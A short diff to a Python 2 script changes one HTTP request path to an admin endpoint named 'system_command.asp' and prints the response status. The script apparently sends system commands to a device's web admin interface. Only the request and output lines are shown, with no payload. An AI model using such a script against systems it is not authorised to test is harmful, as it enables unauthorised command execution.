@@ -47,7 +47,7 @@ def main():
 		exit()
 
 	# get the command output
-	conn.request("GET", "/adm/system_command", params, headers)
+	conn.request("GET", "/adm/system_command.asp", params, headers)
 	response = conn.getresponse()
 
 	print "[+] " + str(response.status), response.reason
